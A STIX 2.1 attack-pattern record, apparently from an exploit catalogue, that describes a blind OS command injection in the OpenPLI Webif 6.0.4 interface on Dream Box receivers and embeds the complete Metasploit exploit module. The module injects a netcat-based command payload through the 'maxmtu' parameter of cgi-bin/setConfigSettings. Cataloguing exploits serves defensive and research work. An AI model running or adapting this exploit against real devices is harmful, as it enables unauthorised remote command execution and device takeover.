{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fcd6dfc8-ce8c-4cfa-a67e-c925c912338b",
    "created": "2024-08-14T17:02:12.193558Z",
    "modified": "2024-08-14T17:02:12.193562Z",
    "name": "OpenPLI Webif Arbitrary Command Execution",
    "description": " Some Dream Boxes with OpenPLI v3 beta Images are vulnerable to OS command injection in the Webif 6.0.4 Web Interface. This is a blind injection, which means that you will not see any output of your command. A ping command can be used for testing the vulnerability.  This module has been tested in a box with the next features: Linux Kernel version 2.6.9 (build@plibouwserver) (gcc version 3.4.4) #1 Wed Aug 17 23:54:07 CEST 2011, Firmware release 1.1.0 (27.01.2013), FP Firmware 1.06 and Web Interface 6.0.4-Expert (PLi edition). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/dreambox_openpli_shell.rb",
            "external_id": "dreambox_openpli_shell.rb"
        },
        {
            "source_name": "reference",
            "url": "http://openpli.org/wiki/Webif"
        },
        {
            "source_name": "reference",
            "url": "http://www.s3cur1ty.de/m1adv2013-007"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'          => 'OpenPLI Webif Arbitrary Command Execution',\n      'Description'   => %q{\n          Some Dream Boxes with OpenPLI v3 beta Images are vulnerable to OS command\n        injection in the Webif 6.0.4 Web Interface. This is a blind injection, which means\n        that you will not see any output of your command. A ping command can be used for\n        testing the vulnerability.  This module has been tested in a box with the next\n        features: Linux Kernel version 2.6.9 (build@plibouwserver) (gcc version 3.4.4) #1\n        Wed Aug 17 23:54:07 CEST 2011, Firmware release 1.1.0 (27.01.2013), FP Firmware\n        1.06 and Web Interface 6.0.4-Expert (PLi edition).\n      },\n      'Author'        => [ 'Michael Messner <devnull[at]s3cur1ty.de>' ],\n      'License'       => MSF_LICENSE,\n      'References'    =>\n        [\n          [ 'OSVDB', '90230' ],\n          [ 'BID', '57943' ],\n          [ 'EDB', '24498' ],\n          [ 'URL', 'http://openpli.org/wiki/Webif' ],\n          [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-007' ]\n        ],\n      'Platform'\t   => %w{ linux unix },\n      'Arch'         => ARCH_CMD,\n      'Privileged'   => true,\n      'Payload'      =>\n        {\n          'Space'       => 1024,\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'netcat generic'\n            }\n        },\n      'Targets'      =>\n        [\n          [ 'Automatic Target', { }]\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2013-02-08'\n    ))\n  end\n\n  def exploit\n    print_status(\"#{rhost}:#{rport} - Sending remote command...\")\n    vprint_status(\"#{rhost}:#{rport} - Blind Exploitation - unknown Exploitation state\")\n    begin\n      send_request_cgi(\n        {\n          'uri'    => normalize_uri(\"cgi-bin\", \"setConfigSettings\"),\n          'method' => 'GET',\n          'vars_get' => {\n            \"maxmtu\" => \"1500&#{payload.encoded}&\"\n          }\n        })\n\n    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT\n      fail_with(Failure::Unreachable, \"#{rhost}:#{rport} - HTTP Connection Failed, Aborting\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-02-08",
    "x_mitre_platforms": [
        "%w{ linux unix }"
    ]
}